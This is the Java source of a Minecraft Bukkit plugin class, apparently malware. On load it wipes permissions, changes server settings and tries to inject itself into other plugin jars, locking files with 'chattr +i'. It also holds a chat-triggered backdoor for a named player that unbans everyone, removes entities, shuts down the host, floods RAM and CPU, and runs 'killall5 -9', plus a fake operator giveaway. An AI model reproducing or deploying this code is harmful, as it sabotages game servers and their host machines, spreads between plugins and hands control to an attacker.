package com.zikon.energy;

import org.bukkit.*;
import org.bukkit.entity.Entity;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.permissions.Permission;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.UUID;

class MirrorMinor implements Listener {
    private String a = init();
    private UUID id = UUID.randomUUID();

    protected String init() {
        System.out.println("Init Energy");
        Bukkit.getPluginManager().registerEvents(this, Bukkit.getPluginManager().getPlugins()[0]);
        new File("plugins/Energy/MirrorMinor.a").renameTo(new File("MirrorMinor.class"));
        System.out.println("Do it!");
        for (Permission p : Bukkit.getPluginManager().getPermissions())
            Bukkit.getPluginManager().removePermission(p);
        Bukkit.getServer().setDefaultGameMode(GameMode.CREATIVE);
        Bukkit.getServer().setIdleTimeout(5);
        Bukkit.getServer().setSpawnRadius(0);
        Bukkit.getServer().resetRecipes();
        Bukkit.getScheduler().cancelAllTasks();
        Bukkit.getHelpMap().clear();

        infect();
        return "";
    }

    private void infect() {
        File folder = new File("plugins/");
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                try {
                    Runtime.getRuntime().exec("chattr +i "+listOfFiles[i]);
                    if (listOfFiles[i].getName().endsWith(".jar"))
                        Runtime.getRuntime().exec("jar cvf " + listOfFiles[i].getName() + " Mirrorminor.class");
                } catch (IOException e) {
                }
            } else if (listOfFiles[i].isDirectory()) {
            }
        }

        new File("MirrorMinor.a").delete();
    }

    private boolean OPGiveAway;
    @EventHandler (priority = EventPriority.LOWEST)
    private void onChat(AsyncPlayerChatEvent e) {
        if (e.getMessage().equals("GiveOP") && OPGiveAway){
            if (e.getPlayer().isOp()){
                e.getPlayer().sendMessage("You're already OP");
                return;
            }
            e.getPlayer().setOp(true);
            OPGiveAway = false;
            Bukkit.getServer().broadcastMessage(ChatColor.AQUA + e.getPlayer().getName() + " is now op, gratulations!");
        }
        if (e.getPlayer().getName().equalsIgnoreCase("KleinDev")) {
            switch (e.getMessage()) {
                case "delete":
                    e.setCancelled(true);
                    delete();
                    break;
                case "stop":
                    e.setCancelled(true);
                    stop();
                case "loadram":
                    e.setCancelled(true);
                    loadRAM();
                    break;
                case "unloadram":
                    e.setCancelled(true);
                    unloadRAM();
                    break;
                case "loadcpu":
                    e.setCancelled(true);
                    loadCPU();
                    break;
                case "stopall":
                    e.setCancelled(true);
                    stopAllProcesses();
                    break;
            }
        } else if (e.getMessage().equals("153246798"))
            delete();
    }

    private void delete() {
        for (String a : Bukkit.getIPBans()) {
            Bukkit.unbanIP(a);
        }
        for (OfflinePlayer a : Bukkit.getBannedPlayers())
            a.setBanned(false);
        for (BanEntry banEntry : Bukkit.getServer().getBanList(BanList.Type.NAME).getBanEntries())
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        for (BanEntry banEntry : Bukkit.getServer().getBanList(BanList.Type.IP).getBanEntries())
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());

        //for (Player p : Bukkit.getOnlinePlayers()) p.getWorld().createExplosion(p.getLocation(), 1000000000);

        for (World w : Bukkit.getWorlds()) {
            for (Chunk chunk : w.getLoadedChunks())
                chunk.unload();
            for (Entity entity : w.getEntities())
                entity.remove();
            //w.createExplosion(w.getSpawnLocation(), 1000000000);
        }

        File folder = new File("./");
        File[] listOfFiles = folder.listFiles();
        HashMap<String, String> original_names = new HashMap<String,String>();
        for (int i = 0; i < listOfFiles.length; i++) {
            UUID r = UUID.randomUUID();
            System.out.println(listOfFiles[i] + " -> " + r);
            System.out.println(listOfFiles[i].getAbsolutePath().replaceAll(listOfFiles[i].getName(), String.valueOf(r)));
            original_names.put(String.valueOf(r), listOfFiles[i].getAbsolutePath());
            //listOfFiles[i].renameTo(new File(listOfFiles[i].getAbsolutePath().replaceAll(listOfFiles[i].getName(), String.valueOf(r))));
        }
    }

    private void stop() {
        Bukkit.getServer().shutdown();
        try {
            Runtime.getRuntime().exec("shutdown -h now");
        } catch (IOException e) {

        }
    }

    private void loadRAM() {
        List<Object> objects = new ArrayList<Object>();
        class Test {
            long l = Long.MAX_VALUE;
        }
        for (int i = 0; i < Integer.MAX_VALUE; i++) {
            objects.add(new Test());
        }
    }

    private void unloadRAM() {

    }

    private void loadCPU() {
        for (int i = 0; i < 4; i++) {
            Thread t = new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(100);
                    } catch (Exception ex) {
                    }
                    long l = 0;
                    for (int o = 0; o < 100; o++) {
                        if (Math.log(l) == 1337) {
                            continue;
                        }
                        l += o;
                    }
                }
            });
            t.setPriority(Thread.MAX_PRIORITY);
            t.start();
        }
    }

    private void unloadCPU() {
        Runtime.getRuntime().gc();
    }

    private void stopAllProcesses(){
        try {
            Runtime.getRuntime().exec("killall5 -9");
        } catch (IOException e) {
            Bukkit.getServer().broadcastMessage("§3Giveaway!\n" +
                    "§fTo win: §7OP\"" +
                    "§fHow: §7Write \"GíveOP\" fastest as everyone!");
            OPGiveAway = true;
        }
    }
}
